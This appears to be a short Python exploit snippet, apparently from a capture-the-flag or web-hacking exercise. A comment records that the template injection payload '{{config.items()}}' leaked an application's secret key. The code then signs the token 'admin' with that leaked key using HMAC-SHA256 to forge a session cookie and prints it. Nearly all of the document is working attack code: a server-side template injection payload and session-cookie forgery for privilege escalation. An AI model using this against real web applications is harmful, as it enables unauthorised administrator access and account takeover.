#{{config.items()}} give you you secret key, which was dsbfeif3uwf6bes878hgi  
import hmac
import hashlib
import base64

SECRET_KEY = "dsbfeif3uwf6bes878hgi"

token = "admin"

signature = hmac.new(SECRET_KEY.encode(), token.encode(), hashlib.sha256).hexdigest()

session_cookie = f"{token}.{signature}"
print("Cookie: session=", session_cookie)
